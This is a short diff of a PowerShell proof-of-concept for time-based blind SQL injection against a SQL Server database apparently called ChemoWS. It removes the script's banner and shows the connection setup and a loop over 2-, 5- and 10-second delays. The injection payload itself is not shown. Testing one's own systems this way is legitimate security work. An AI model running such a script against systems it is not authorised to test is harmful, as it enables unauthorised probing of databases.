@@ -11,11 +11,6 @@ if ($auth -eq "y") {
     $connString = "Server=$server;Database=$database;User Id=$user;Password=$pass;TrustServerCertificate=True;"
 }
 
-Write-Host "`n============================================================"
-Write-Host "ChemoWS - Time-Based Blind SQL Injection POC"
-Write-Host "Target: $server | Database: $database"
-Write-Host "============================================================`n"
-
 foreach ($delay in @("0:0:2", "0:0:5", "0:0:10")) {
     $conn = New-Object System.Data.SqlClient.SqlConnection($connString)
     $conn.Open()
